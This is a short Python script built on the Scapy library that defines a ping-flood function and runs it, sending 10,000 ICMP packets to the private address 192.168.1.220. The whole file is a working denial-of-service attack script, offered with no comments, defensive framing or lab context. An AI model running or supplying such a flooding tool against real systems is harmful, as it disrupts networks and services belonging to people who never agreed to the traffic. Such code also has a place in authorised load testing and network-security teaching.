from scapy.all import IP, ICMP, send


def PING_Flood(targetIP, numPackets):
    while numPackets > 0:
        send(IP(dst=targetIP)/ICMP(), verbose=0)
        numPackets = numPackets - 1

PING_Flood('192.168.1.220', 10000)